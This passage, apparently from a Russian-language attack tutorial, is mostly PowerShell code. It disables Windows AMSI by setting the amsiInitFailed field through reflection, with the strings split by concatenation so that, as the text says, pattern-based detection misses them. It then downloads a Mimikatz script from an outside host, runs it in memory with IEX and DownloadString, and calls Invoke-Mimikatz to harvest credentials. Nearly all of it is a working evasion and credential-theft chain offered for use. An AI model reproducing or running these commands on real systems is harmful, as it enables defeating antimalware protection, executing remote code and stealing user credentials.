$utils = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')

Затем мы выполняем выборку ссылки на значение атрибута amsiInitFailed и устанавливаем его в True.  Во избежание какого бы то ни было полагающегося на лёгкое соответствие шаблону обнаружения мы пробрасываем это в небольшой конкатенации строки:
$field = $utils.GetField('amsi'+'InitF'+'ailed','NonPublic,Static')
$field.SetValue($null,$true)

Готово, теперь запускаем на исполнение Mimikatz при отключенном AMSI:
$browser = New-Object System.Net.WebClient
$file="https://sf-res.com/Invoke-mimi.ps1"
IEX($browser.DownloadString($file))
Invoke-Mimikatz
